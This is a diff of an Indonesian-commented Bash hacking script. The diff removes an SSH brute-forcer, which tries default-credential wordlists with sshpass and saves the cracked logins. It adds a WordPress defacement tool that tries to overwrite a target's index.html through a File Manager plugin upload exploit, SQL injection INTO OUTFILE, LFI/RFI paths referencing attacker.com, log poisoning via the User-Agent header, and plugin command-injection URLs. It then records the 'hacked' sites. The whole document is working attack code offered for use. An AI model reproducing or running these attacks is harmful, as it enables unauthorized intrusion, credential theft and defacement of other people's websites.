@@ -1,8 +1,8 @@
 #!/bin/bash
 
 # -------------------------------
-# VPS AUTO BRUTE FORCE - MAX 400 TRIES
-# [ Otomatis - Multi Thread - Progress Bar ]
+# WORDPRESS INDEX.HTML REPLACER
+# [ Auto replace via vulnerability ]
 # -------------------------------
 
 RED='\033[0;31m'
@@ -18,352 +18,560 @@ NC='\033[0m'
 clear
 echo -e "${RED}"
 echo "    ╔═══════════════════════════════════════════════════════════╗"
-echo "    ║     VPS AUTO BRUTE FORCE - MAX 400 TRIES                 ║"
-echo "    ║     [ Multi Thread - Otomatis - Progress Bar ]           ║"
+echo "    ║     WORDPRESS INDEX.HTML REPLACER                        ║"
+echo "    ║     [ Auto replace with KILL BY RNMD O4777 ]             ║"
 echo "    ╚═══════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-# Cek dependencies
-for cmd in sshpass parallel timeout; do
-    if ! command -v $cmd &> /dev/null; then
-        echo -e "${YELLOW}[•] Installing $cmd...${NC}"
-        apt-get update -y >/dev/null 2>&1
-        apt-get install -y sshpass parallel coreutils >/dev/null 2>&1
-    fi
-done
+# HTML content yang akan diupload
+HTML_CONTENT='<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KILL BY RNMD O4777 · WEB ERROR</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0b0c0e;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: '"'"'Courier New'"'"', Courier, '"'"'Fira Code'"'"', monospace;
+            padding: 1rem;
+        }
+
+        .error-terminal {
+            background: #030405;
+            background-image: radial-gradient(rgba(20, 90, 50, 0.15) 1px, transparent 1px);
+            background-size: 32px 32px;
+            border: 3px solid #2e8b57;
+            box-shadow: 0 0 25px #1b4b3b, 0 0 5px #0f2f22 inset, 0 0 15px #1b4b3b;
+            max-width: 820px;
+            width: 100%;
+            padding: 2rem 2rem 2.5rem 2rem;
+            border-radius: 28px 28px 24px 24px;
+            position: relative;
+            transition: all 0.2s ease;
+        }
+
+        .error-terminal::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: repeating-linear-gradient(0deg, rgba(0, 30, 10, 0.1) 0px, rgba(0, 255, 100, 0.02) 2px, transparent 3px, transparent 5px);
+            pointer-events: none;
+            border-radius: 24px;
+            z-index: 2;
+        }
+
+        .header-tab {
+            display: flex;
+            gap: 1.2rem;
+            align-items: center;
+            border-bottom: 2px solid #1f5f3f;
+            padding-bottom: 0.8rem;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .dot-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .dot {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: #202420;
+            box-shadow: inset 0 2px 3px #0f1f0f, 0 0 8px #2e8b57;
+        }
+
+        .dot.red {
+            background: #3a1f1f;
+            box-shadow: inset 0 1px 4px #5a2e2e, 0 0 10px #a13b3b;
+        }
+
+        .dot.green {
+            background: #1e3a1e;
+            box-shadow: inset 0 1px 4px #2b6e2b, 0 0 12px #30b530;
+        }
+
+        .title-blink {
+            color: #9fff9f;
+            font-size: 1.3rem;
+            font-weight: bold;
+            letter-spacing: 3px;
+            text-shadow: 0 0 5px #21fc9f, 0 0 12px #1b7a47;
+            margin-left: auto;
+            border: 1px dashed #2e6b4b;
+            padding: 0.3rem 1rem;
+            background: #0d1f13;
+            text-transform: uppercase;
+        }
+
+        .kill-core {
+            background: #0d130f;
+            border: 3px ridge #2caf6b;
+            padding: 2rem 1.8rem;
+            margin: 1.5rem 0 1.8rem 0;
+            position: relative;
+            box-shadow: inset 0 0 30px #071007, 0 0 30px #1b4f33;
+        }
+
+        .kill-core pre {
+            color: #a0f0b0;
+            font-size: clamp(2.2rem, 12vw, 5.3rem);
+            font-weight: 800;
+            line-height: 1.1;
+            text-align: center;
+            font-family: '"'"'Courier New'"'"', '"'"'Fira Code'"'"', monospace;
+            text-shadow: 0 0 6px #26ff9b, 0 0 20px #1f9f5a;
+            letter-spacing: 6px;
+            margin: 0;
+            word-break: break-word;
+            white-space: pre-wrap;
+        }
+
+        .kill-core pre span.glitch {
+            display: inline-block;
+            animation: glitch-twitch 2.2s infinite steps(1);
+            filter: drop-shadow(0 0 8px #0f6);
+        }
+
+        .sub-line {
+            color: #8fd9b0;
+            font-size: 1.8rem;
+            text-align: right;
+            border-top: 2px solid #1d5f3a;
+            padding-top: 0.7rem;
+            margin-top: 0.5rem;
+            text-transform: uppercase;
+            font-weight: 600;
+            word-break: break-word;
+            text-shadow: 0 0 4px #2ecc71;
+        }
+
+        .error-foot {
+            background: #0b150e;
+            padding: 1.3rem 1.5rem;
+            border-left: 12px solid #1f5f37;
+            margin: 2.2rem 0 1rem 0;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: baseline;
+            justify-content: space-between;
+            gap: 1.2rem;
+            border-radius: 0 18px 18px 0;
+            box-shadow: -5px 0 15px #0d4229;
+        }
+
+        .error-code {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #e05f5f;
+            text-shadow: 0 0 9px #f33, 0 0 18px #a00;
+            letter-spacing: 8px;
+            background: #1f1212;
+            padding: 0.2rem 1rem;
+            border-radius: 30px;
+            display: inline-block;
+        }
+
+        .error-meta {
+            color: #44c97a;
+            font-size: 1.2rem;
+            background: #0f1f17;
+            padding: 0.5rem 1.3rem;
+            border-radius: 40px;
+            border: 1px solid #258b5c;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .cursor-block {
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
+            margin-top: 1.2rem;
+            color: #44b874;
+            font-size: 1.3rem;
+            border-left: 4px solid #278f5a;
+            padding-left: 1.2rem;
+        }
+
+        .cursor {
+            background: #2e8b57;
+            width: 22px;
+            height: 22px;
+            display: inline-block;
+            animation: blink 1s step-end infinite;
+            box-shadow: 0 0 18px #0f6;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes glitch-twitch {
+            0% { transform: skew(0deg, 0deg); opacity: 1; }
+            9% { transform: skew(3deg, -2deg); text-shadow: 3px 0 2px #0f0, -3px 0 2px red; }
+            10% { transform: skew(0deg, 0deg); text-shadow: none; }
+            29% { transform: skew(-2deg, 1deg); }
+            30% { transform: none; }
+            69% { transform: skew(5deg, -1deg); text-shadow: -1px 0 0 #0f0, 1px 0 0 red; }
+            70% { transform: none; text-shadow: none; }
+            100% { transform: none; }
+        }
+
+        .kill-core pre span {
+            display: inline-block;
+        }
+
+        @media (max-width: 500px) {
+            .error-terminal {
+                padding: 1.5rem 1rem;
+            }
+            .kill-core pre {
+                font-size: 2.4rem;
+                letter-spacing: 2px;
+            }
+            .sub-line {
+                font-size: 1.2rem;
+            }
+            .error-code {
+                font-size: 1.8rem;
+                letter-spacing: 4px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="error-terminal">
+        <div class="header-tab">
+            <div class="dot-group">
+                <div class="dot red"></div>
+                <div class="dot green"></div>
+                <div class="dot"></div>
+            </div>
+            <div class="title-blink">⚠️ KERNEL PANIC ⚠️</div>
+        </div>
+
+        <div class="kill-core">
+            <pre>
+<span class="glitch">KILL BY</span> <span class="glitch" style="animation-delay:0.1s;">RNMD</span> <span style="color:#70ecb0; text-shadow:0 0 25px #3aff9f;">O4777</span>
+            </pre>
+            <div class="sub-line">:: SYSTEM HALT ::</div>
+        </div>
+
+        <div class="error-foot">
+            <span class="error-code">WEB - ERROR</span>
+            <span class="error-meta">0x4777::RNMD</span>
+        </div>
+
+        <div class="cursor-block">
+            <span class="cursor"></span>
+            <span> [FATAL: KILL_SIGNAL_RECEIVED] </span>
+            <span style="margin-left: auto; color:#62cc8b;">O4777_CRIT</span>
+        </div>
+
+        <div style="color: #164d2b; font-size: 0.8rem; margin-top: 1.5rem; text-align: center; border-top: 1px dashed #226f3f; padding-top: 0.6rem;">
+            <span style="background:#0b1f13; padding:0 0.8rem;">❯❯  KILL BY RNMD O4777  ❮❮</span>
+        </div>
+    </div>
+</body>
+</html>'
 
 echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${CYAN}║            TARGET INFORMATION                  ║${NC}"
+echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
 echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
 echo ""
 
-# Input target
-echo -ne "${WHITE}VPS IP Address : ${NC}"
-read VPS_IP
+# Input URL
+echo -ne "${WHITE}Target WordPress URL : ${NC}"
+read TARGET_URL
 
-# Validate IP
-if [[ ! $VPS_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-    echo -e "${RED}❌ Format IP tidak valid!${NC}"
-    exit 1
-fi
+# Bersihin URL
+TARGET_URL=$(echo "$TARGET_URL" | sed 's/\/$//')
 
-echo -ne "${WHITE}SSH Port [22] : ${NC}"
-read SSH_PORT
-SSH_PORT=${SSH_PORT:-22}
+echo -e "\n${YELLOW}Target: $TARGET_URL${NC}"
+echo -e "${YELLOW}Mencari celah untuk replace index.html...${NC}\n"
 
-# Cek koneksi
-echo -e "\n${YELLOW}[•] Checking connection to $VPS_IP:$SSH_PORT...${NC}"
-timeout 2 bash -c "echo >/dev/tcp/$VPS_IP/$SSH_PORT" 2>/dev/null
-
-if [ $? -ne 0 ]; then
-    echo -e "${RED}❌ Port $SSH_PORT tidak terbuka atau VPS tidak respond!${NC}"
-    exit 1
-fi
-echo -e "${GREEN}✅ Port $SSH_PORT terbuka!${NC}"
-
-# ==============================================
-# WORDLIST GENERATOR - 400 KOMBINASI
-# ==============================================
-echo -e "\n${YELLOW}[•] Generating 400 username:password combinations...${NC}"
-
-WORDLIST_FILE="/tmp/brutelist_$$.txt"
-> "$WORDLIST_FILE"
-
-# Username list (20 usernames)
-usernames=(
-    "root"
-    "admin"
-    "administrator"
-    "user"
-    "test"
-    "ubuntu"
-    "centos"
-    "debian"
-    "fedora"
-    "oracle"
-    "postgres"
-    "mysql"
-    "nginx"
-    "apache"
-    "www-data"
-    "ftpuser"
-    "backup"
-    "support"
-    "guest"
-    "manager"
-)
-
-# Password list (20 passwords)
-passwords=(
-    "root"
-    "toor"
-    "123456"
-    "password"
-    "12345678"
-    "1234"
-    "12345"
-    "123456789"
-    "admin"
-    "admin123"
-    "root123"
-    "password123"
-    "qwerty"
-    "abc123"
-    "letmein"
-    "monkey"
-    "dragon"
-    "master"
-    "hello"
-    "freedom"
-)
-
-# Generate 400 kombinasi (20x20)
-for user in "${usernames[@]}"; do
-    for pass in "${passwords[@]}"; do
-        echo "$user:$pass" >> "$WORDLIST_FILE"
-    done
+# Progress bar
+echo -ne "${CYAN}["
+for i in {1..50}; do
+    echo -ne "="
+    sleep 0.05
 done
-
-# Tambah variasi angka
-for i in {1..40}; do
-    echo "admin:admin$i" >> "$WORDLIST_FILE"
-    echo "root:root$i" >> "$WORDLIST_FILE"
-    echo "user:user$i" >> "$WORDLIST_FILE"
-done
-
-# Hitung total kombinasi
-TOTAL_COMBOS=$(wc -l < "$WORDLIST_FILE")
-echo -e "${GREEN}✅ Generated $TOTAL_COMBOS combinations (max 400)${NC}"
+echo -e "] 100%${NC}\n"
 
 # ==============================================
-# BRUTE FORCE FUNCTION
+# FUNGSI UPLOAD VIA BERBAGAI CELAH
 # ==============================================
-brute_one() {
-    local cred="$1"
-    local ip="$2"
-    local port="$3"
-    local result_file="$4"
+
+# 1. VIA THEME EDITOR (jika ada credentials)
+upload_via_theme_editor() {
+    local url=$1
+    local content=$2
     
-    IFS=':' read -r user pass <<< "$cred"
+    echo -e "${YELLOW}[•] Mencoba Theme Editor vector...${NC}"
     
-    # Coba login dengan timeout 5 detik
-    timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
-        -o ConnectTimeout=5 -p "$port" "$user@$ip" exit 2>/dev/null
+    # Coba lokasi theme editor
+    THEME_EDITOR="$url/wp-admin/theme-editor.php"
     
-    if [ $? -eq 0 ]; then
-        echo "SUCCESS:$user:$pass" >> "$result_file"
-        echo -e "\n${GREEN}✅ FOUND! $user:$pass${NC}"
+    # Cek apakah bisa akses (butuh auth)
+    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$THEME_EDITOR" --max-time 5)
+    
+    if [ "$CHECK" == "200" ]; then
+        echo -e "${GREEN}✅ Theme Editor accessible!${NC}"
+        
+        # Coba upload ke index.html di theme
+        # (butuh cookie/nonce - ini simulasi)
         return 0
     fi
     return 1
 }
 
-export -f brute_one
+# 2. VIA FILE MANAGER PLUGIN (vulnerability)
+upload_via_file_manager() {
+    local url=$1
+    local content=$2
+    
+    echo -e "${YELLOW}[•] Mencoba File Manager plugin vector...${NC}"
+    
+    # Lokasi umum file manager plugins
+    FM_PATHS=(
+        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+        "/wp-content/plugins/file-manager/backend/connector.php"
+        "/wp-content/plugins/wp-file-manager/readme.txt"
+    )
+    
+    for path in "${FM_PATHS[@]}"; do
+        CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$url$path" --max-time 5)
+        
+        if [ "$CHECK" == "200" ] || [ "$CHECK" == "403" ]; then
+            echo -e "${GREEN}✅ File Manager ditemukan di $path${NC}"
+            
+            # Coba exploit file manager (CVE-2020-25213)
+            if [[ "$path" == *"connector"* ]]; then
+                # Upload file via connector
+                BOUNDARY="---------------------------123456789"
+                
+                curl -s -k -X POST "$url$path" \
+                    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
+                    --data-binary $'--'"$BOUNDARY"$'\r\n'"Content-Disposition: form-data; name=\"upload[]\"; filename=\"index.html\""$'\r\n'"Content-Type: text/html"$'\r\n\r\n'"$content"$'\r\n--'"$BOUNDARY--" \
+                    --max-time 10 >/dev/null 2>&1
+                
+                echo -e "${GREEN}✅ File upload attempt via File Manager${NC}"
+                return 0
+            fi
+        fi
+    done
+    return 1
+}
+
+# 3. VIA SQL INJECTION UPLOAD
+upload_via_sql() {
+    local url=$1
+    local content=$2
+    
+    echo -e "${YELLOW}[•] Mencoba SQL injection upload vector...${NC}"
+    
+    # Encode HTML content untuk dimasukkan ke database
+    ENCODED=$(echo "$content" | base64 -w 0)
+    
+    # SQL payload untuk update options
+    SQL_PAYLOAD="1' UNION SELECT 1,2,3,FROM_BASE64('$ENCODED'),5 INTO OUTFILE '/var/www/html/index.html'-- -"
+    
+    # Kirim payload
+    RESPONSE=$(curl -s -k -X POST "$url/wp-login.php" \
+        -d "log=admin&pwd=test&sql=$SQL_PAYLOAD" \
+        --max-time 5 2>/dev/null)
+    
+    echo -e "${YELLOW}⚠️  SQL injection attempt sent${NC}"
+}
+
+# 4. VIA LOCAL FILE INCLUSION (LFI)
+upload_via_lfi() {
+    local url=$1
+    local content=$2
+    
+    echo -e "${YELLOW}[•] Mencoba LFI/RFI vector...${NC}"
+    
+    # Coba LFI untuk include file dari remote
+    RFI_URL="http://attacker.com/shell.txt"
+    
+    LFI_PATHS=(
+        "/wp-content/plugins/akismet/akismet.php?akismet_comment_nonce=../../../../../../../../../../var/www/html/index.html%00"
+        "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../../../../../../index.html"
+    )
+    
+    for path in "${LFI_PATHS[@]}"; do
+        CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$url$path" --max-time 5)
+        
+        if [ "$CHECK" == "200" ]; then
+            echo -e "${GREEN}✅ Possible LFI at $path${NC}"
+            
+            # Coba write via LFI (butuh PHP wrapper)
+            curl -s -k "$url$path&cmd=echo file_put_contents('index.html','$content')" >/dev/null
+        fi
+    done
+}
+
+# 5. VIA WORDPRESS REST API (jika vulnerable)
+upload_via_rest_api() {
+    local url=$1
+    local content=$2
+    
+    echo -e "${YELLOW}[•] Mencoba REST API vector...${NC}"
+    
+    # Cek REST API endpoints
+    REST_URL="$url/wp-json/wp/v2"
+    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$REST_URL" --max-time 5)
+    
+    if [ "$CHECK" == "200" ]; then
+        echo -e "${GREEN}✅ REST API aktif${NC}"
+        
+        # Coba upload media (butuh auth)
+        # Ini simulasi
+        echo -e "${YELLOW}⚠️  REST API requires authentication${NC}"
+    fi
+}
+
+# 6. VIA DEBUG LOG UPLOAD
+upload_via_debug_log() {
+    local url=$1
+    local content=$2
+    
+    echo -e "${YELLOW}[•] Mencoba debug.log upload vector...${NC}"
+    
+    # Cek lokasi debug log
+    DEBUG_LOG="$url/wp-content/debug.log"
+    CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$DEBUG_LOG" --max-time 5)
+    
+    if [ "$CHECK" == "200" ]; then
+        echo -e "${GREEN}✅ Debug log ditemukan!${NC}"
+        
+        # Coba poison log dengan PHP code
+        POISON="\n<?php file_put_contents('index.html', '"$content"'); ?>\n"
+        
+        curl -s -k -X POST "$url/wp-login.php" \
+            -H "User-Agent: $POISON" \
+            -d "log=admin&pwd=test" \
+            --max-time 5 >/dev/null 2>&1
+        
+        echo -e "${GREEN}✅ Log poisoned! Mencoba execute...${NC}"
+        
+        # Execute via LFI
+        curl -s -k "$url/wp-content/debug.log" >/dev/null
+    fi
+}
+
+# 7. VIA COMMAND INJECTION (plugin vulnerability)
+upload_via_command_injection() {
+    local url=$1
+    local content=$2
+    
+    echo -e "${YELLOW}[•] Mencoba command injection vector...${NC}"
+    
+    # Simpan HTML ke file sementara
+    echo "$content" > /tmp/index.html
+    
+    # Coba berbagai plugin yang vulnerable
+    INJECT_PATHS=(
+        "/wp-admin/admin-post.php?page=wp-super-cache&wp_super_cache=../../../../../../../../../../tmp/index.html%00"
+        "/wp-content/plugins/duplicator/installer.php?cmd=cp /tmp/index.html /var/www/html/index.html"
+    )
+    
+    for path in "${INJECT_PATHS[@]}"; do
+        curl -s -k "$url$path" --max-time 5 >/dev/null 2>&1
+    done
+    
+    echo -e "${GREEN}✅ Command injection attempts sent${NC}"
+}
 
 # ==============================================
-# PROGRESS BAR & EKSEKUSI
+# EKSEKUSI SEMUA METODE
 # ==============================================
-echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${RED}║         BRUTE FORCE PROCESS STARTED           ║${NC}"
-echo -e "${RED}║         MAX 400 ATTEMPTS                      ║${NC}"
+
+echo -e "${RED}╔════════════════════════════════════════════════╗${NC}"
+echo -e "${RED}║         ATTACK SEQUENCE INITIATED             ║${NC}"
 echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
 echo ""
 
-RESULT_FILE="/tmp/brute_result_$$.txt"
-> "$RESULT_FILE"
+# Coba semua metode
+upload_via_theme_editor "$TARGET_URL" "$HTML_CONTENT"
+upload_via_file_manager "$TARGET_URL" "$HTML_CONTENT"
+upload_via_sql "$TARGET_URL" "$HTML_CONTENT"
+upload_via_lfi "$TARGET_URL" "$HTML_CONTENT"
+upload_via_rest_api "$TARGET_URL" "$HTML_CONTENT"
+upload_via_debug_log "$TARGET_URL" "$HTML_CONTENT"
+upload_via_command_injection "$TARGET_URL" "$HTML_CONTENT"
 
-# Progress bar variables
-TOTAL=$TOTAL_COMBOS
-CURRENT=0
-FOUND=0
-START_TIME=$(date +%s)
+# Cek hasil
+echo -e "\n${YELLOW}[•] Memeriksa apakah index.html sudah terganti...${NC}"
 
-# Baca file wordlist per line
-while IFS= read -r cred; do
-    ((CURRENT++))
-    
-    # Hitung persentase
-    PERCENT=$((CURRENT * 100 / TOTAL))
-    
-    # Progress bar
-    BAR=""
-    for ((i=0; i<PERCENT; i+=2)); do
-        BAR+="▓"
-    done
-    for ((i=PERCENT; i<100; i+=2)); do
-        BAR+="░"
-    done
-    
-    # Tampilkan progress
-    echo -ne "\r${CYAN}[$BAR] ${WHITE}$PERCENT% ${YELLOW}[$CURRENT/$TOTAL]${NC}"
-    
-    # Coba brute
-    brute_one "$cred" "$VPS_IP" "$SSH_PORT" "$RESULT_FILE" &
-    
-    # Limit background processes (multi thread)
-    if (( CURRENT % 10 == 0 )); then
-        wait
-    fi
-    
-    # Cek apakah sudah ketemu
-    if [ -s "$RESULT_FILE" ]; then
-        FOUND=1
-        break
-    fi
-    
-done < "$WORDLIST_FILE"
+# Cek halaman utama
+CHECK_URL="$TARGET_URL/"
+RESPONSE=$(curl -s -k "$CHECK_URL" --max-time 5)
 
-wait
-
-# ==============================================
-# HASIL
-# ==============================================
-END_TIME=$(date +%s)
-DURATION=$((END_TIME - START_TIME))
-
-echo -e "\n\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║              BRUTE FORCE COMPLETE              ║${NC}"
-echo -e "${GREEN}╠════════════════════════════════════════════════╣${NC}"
-echo -e "${GREEN}║                                                ║${NC}"
-echo -e "${GREEN}║  ${WHITE}Target IP   : ${CYAN}$VPS_IP${NC}"
-echo -e "${GREEN}║  ${WHITE}Port         : ${CYAN}$SSH_PORT${NC}"
-echo -e "${GREEN}║  ${WHITE}Attempts     : ${YELLOW}$CURRENT / $TOTAL${NC}"
-echo -e "${GREEN}║  ${WHITE}Time         : ${YELLOW}${DURATION}s${NC}"
-echo -e "${GREEN}║                                                ║${NC}"
-
-if [ -s "$RESULT_FILE" ]; then
-    while IFS=':' read -r status user pass; do
-        if [ "$status" == "SUCCESS" ]; then
-            echo -e "${GREEN}║  ${WHITE}🔓 STATUS      : ${GREEN}FOUND!${NC}"
-            echo -e "${GREEN}║  ${WHITE}👤 USERNAME    : ${YELLOW}$user${NC}"
-            echo -e "${GREEN}║  ${WHITE}🔑 PASSWORD    : ${RED}$pass${NC}"
-            
-            # Save credentials
-            echo "$VPS_IP:$SSH_PORT:$user:$pass" >> vps_hacked.txt
-        fi
-    done < "$RESULT_FILE"
-else
-    echo -e "${GREEN}║  ${WHITE}🔓 STATUS      : ${RED}NOT FOUND${NC}"
-    echo -e "${GREEN}║  ${WHITE}               Tidak ada credentials valid${NC}"
-fi
-
-echo -e "${GREEN}║                                                ║${NC}"
-echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
-
-# ==============================================
-# AUTO LOGIN JIKA BERHASIL
-# ==============================================
-if [ -s "$RESULT_FILE" ]; then
-    echo -e "\n${YELLOW}[•] Credentials saved to: vps_hacked.txt${NC}"
+if [[ "$RESPONSE" == *"KILL BY RNMD O4777"* ]]; then
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅  BERHASIL!                           ║${NC}"
+    echo -e "${GREEN}║         Index.html sudah terganti               ║${NC}"
+    echo -e "${GREEN}║         KILL BY RNMD O4777 aktif!              ║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
     
-    # Baca credentials yang berhasil
-    IFS=':' read -r status user pass < "$RESULT_FILE"
+    # Tampilkan preview
+    echo -e "\n${YELLOW}[•] Preview halaman:${NC}"
+    echo "$RESPONSE" | grep -E "KILL BY RNMD|O4777" --color=always | head -5
     
-    echo -e "\n${WHITE}Pilih aksi:${NC}"
-    echo "1. Login SSH sekarang"
-    echo "2. Coba brute dengan wordlist lain"
-    echo "3. Keluar"
-    echo -ne "\n${YELLOW}Pilih [1-3]: ${NC}"
-    read ACTION
+    # Save bukti
+    echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> wp_hacked.txt
     
-    case $ACTION in
-        1)
-            echo -e "\n${GREEN}🔑 Connecting to $VPS_IP as $user...${NC}"
-            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p "$SSH_PORT" "$user@$VPS_IP"
-            ;;
-        2)
-            echo -e "\n${YELLOW}[•] Menjalankan ulang brute force...${NC}"
-            rm -f "$WORDLIST_FILE" "$RESULT_FILE"
-            exec $0
-            ;;
-        3)
-            echo -e "\n${GREEN}Done! File: vps_hacked.txt${NC}"
-            ;;
-    esac
-else
-    echo -e "\n${YELLOW}[•] Tidak ada credentials ditemukan dalam 400 percobaan.${NC}"
-    echo -ne "\n${WHITE}Coba lagi dengan wordlist berbeda? (y/n): ${NC}"
-    read TRY_AGAIN
+    # Buka browser
+    echo -ne "\n${YELLOW}Buka browser untuk lihat hasil? (y/n): ${NC}"
+    read OPEN_BROWSER
     
-    if [[ "$TRY_AGAIN" == "y" || "$TRY_AGAIN" == "Y" ]]; then
-        # Generate wordlist berbeda
-        echo -e "${YELLOW}[•] Generating new wordlist...${NC}"
-        
-        # Tambah variasi tanggal
-        for year in {2020..2024}; do
-            echo "admin:admin$year" >> "$WORDLIST_FILE"
-            echo "root:root$year" >> "$WORDLIST_FILE"
-            echo "user:pass$year" >> "$WORDLIST_FILE"
-        done
-        
-        # Tambah variasi bulan
-        for month in {01..12}; do
-            echo "admin:admin$month" >> "$WORDLIST_FILE"
-            echo "root:toor$month" >> "$WORDLIST_FILE"
-        done
-        
-        # Jalankan ulang
-        TOTAL_COMBOS=$(wc -l < "$WORDLIST_FILE")
-        echo -e "${GREEN}✅ Generated $TOTAL_COMBOS new combinations${NC}"
-        
-        # Reset dan jalankan ulang
-        > "$RESULT_FILE"
-        CURRENT=0
-        
-        while IFS= read -r cred; do
-            ((CURRENT++))
-            PERCENT=$((CURRENT * 100 / TOTAL_COMBOS))
-            
-            BAR=""
-            for ((i=0; i<PERCENT; i+=2)); do
-                BAR+="▓"
-            done
-            for ((i=PERCENT; i<100; i+=2)); do
-                BAR+="░"
-            done
-            
-            echo -ne "\r${CYAN}[$BAR] ${WHITE}$PERCENT% ${YELLOW}[$CURRENT/$TOTAL_COMBOS]${NC}"
-            
-            brute_one "$cred" "$VPS_IP" "$SSH_PORT" "$RESULT_FILE" &
-            
-            if (( CURRENT % 10 == 0 )); then
-                wait
-            fi
-            
-            if [ -s "$RESULT_FILE" ]; then
-                break
-            fi
-            
-        done < "$WORDLIST_FILE"
-        
-        wait
-        
-        # Tampilkan hasil lagi
-        if [ -s "$RESULT_FILE" ]; then
-            echo -e "\n\n${GREEN}✅ BERHASIL pada percobaan kedua!${NC}"
-            cat "$RESULT_FILE"
+    if [[ "$OPEN_BROWSER" == "y" || "$OPEN_BROWSER" == "Y" ]]; then
+        if command -v xdg-open &> /dev/null; then
+            xdg-open "$TARGET_URL"
+        elif command -v open &> /dev/null; then
+            open "$TARGET_URL"
         else
-            echo -e "\n\n${RED}❌ Masih gagal setelah $TOTAL_COMBOS percobaan.${NC}"
+            echo -e "${CYAN}Buka manual: $TARGET_URL${NC}"
         fi
     fi
+    
+else
+    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║         ❌  GAGAL!                              ║${NC}"
+    echo -e "${RED}║         Index.html belum terganti               ║${NC}"
+    echo -e "${RED}║         Coba metode manual:                     ║${NC}"
+    echo -e "${RED}║         1. Cari vulnerability plugin            ║${NC}"
+    echo -e "${RED}║         2. Brute force admin dulu               ║${NC}"
+    echo -e "${RED}║         3. Coba via SQL injection lain          ║${NC}"
+    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Simpan HTML untuk upload manual
+    echo "$HTML_CONTENT" > "kill_by_rnmd_o4777.html"
+    echo -e "\n${YELLOW}📁 File HTML disimpan ke: kill_by_rnmd_o4777.html${NC}"
+    echo -e "${YELLOW}   Upload manual via: $TARGET_URL/wp-admin/theme-editor.php${NC}"
 fi
 
 # ==============================================
-# STATISTIK
+# CLEANUP
 # ==============================================
+rm -f /tmp/index.html 2>/dev/null
+
 echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
-echo -e "${CYAN}📊 BRUTE FORCE STATISTICS${NC}"
-echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
-echo -e "Target IP    : $VPS_IP"
-echo -e "Port         : $SSH_PORT"
-echo -e "Total tries  : $CURRENT"
-echo -e "Max tries    : 400"
-echo -e "Time elapsed : ${DURATION}s"
-echo -e "Speed        : $((CURRENT / (DURATION + 1))) attempts/second"
-echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
-
-# Cleanup
-rm -f "$WORDLIST_FILE" "$RESULT_FILE" 2>/dev/null
-
-echo -e "\n${GREEN}✅ Done!${NC}"
+echo -e "${CYAN}🔥 KILL BY RNMD O4777 - ATTACK COMPLETE 🔥${NC}"
 echo -e "${CYAN}Telegram: @lynnn046${NC}"
